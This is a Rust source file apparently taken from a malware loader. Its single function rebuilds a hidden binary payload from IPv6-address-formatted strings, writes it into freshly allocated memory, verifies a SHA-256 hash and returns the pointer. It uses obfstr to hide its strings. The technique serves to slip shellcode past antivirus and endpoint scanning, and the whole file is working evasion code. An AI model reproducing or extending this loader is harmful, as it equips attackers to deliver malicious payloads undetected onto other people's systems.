use crate::alloc::alloc;
use obfstr::obfstr;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    use sha2::{Sha256, Digest};
    use obfstr::obfstr;
    let data_str = std::str::from_utf8(decoded).map_err(|_| obfstr!("invalid utf8").to_string())?;
    let parts: Vec<&str> = data_str.split(',').collect();
    if parts.len() < 3 {
        return Err(obfstr!("ipv6 payload format invalid").to_string());
    }
    let hex_hash = parts[0];
    let length_str = parts[1];
    let addresses_str = parts[2..].join(",");
    let hash = hex::decode(hex_hash).map_err(|_| obfstr!("invalid hex hash").to_string())?;
    if hash.len() != 32 {
        return Err(obfstr!("hash length mismatch").to_string());
    }
    let original_len: usize = length_str.parse().map_err(|_| obfstr!("invalid length").to_string())?;
    let addresses: Vec<&str> = addresses_str.split(',').collect();
    let p = unsafe { alloc(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    'outer: for addr_str in addresses {
        let parts: Vec<&str> = addr_str.split(':').collect();
        if parts.len() != 8 { return Err(obfstr!("Invalid IPv6 address").to_string()); }
        for p in parts {
            if idx + 1 >= original_len { break 'outer; }
            let v = u16::from_str_radix(p, 16).map_err(|_| obfstr!("Invalid IPv6 segment").to_string())?;
            let bytes = v.to_be_bytes();
            if idx < original_len { buf[idx] = bytes[0]; idx += 1; }
            if idx < original_len { buf[idx] = bytes[1]; idx += 1; }
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obfstr!("ipv6 hash mismatch").to_string());
    }
    Ok((p as usize, original_len))
}